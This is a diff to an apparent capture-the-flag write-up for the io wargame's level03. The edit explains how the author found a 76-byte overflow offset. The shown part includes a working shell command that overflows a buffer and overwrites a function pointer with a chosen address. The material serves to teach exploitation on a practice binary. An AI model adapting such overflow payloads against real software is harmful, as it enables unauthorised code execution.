@@ -48,7 +48,7 @@ This is exciting we're going to 0x80484a4
 I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
 ```
 
-To figure out how many bytes we need to overflow the buffer and other stuff we can first 
+To figure out how many bytes we need to overflow the buffer and other stuff we can just try to figure out the necessary amount of bytes needed to overflow and change the function pointer. This turns out to be 76 (it's obviously more then 50 as we first need to overflow the buffer set for argv[1])
 
 ```console
 level3@io:/levels$ ./level03 $(python -c 'print "\x41" * 76 + "\x74\x84\x04\x08"')
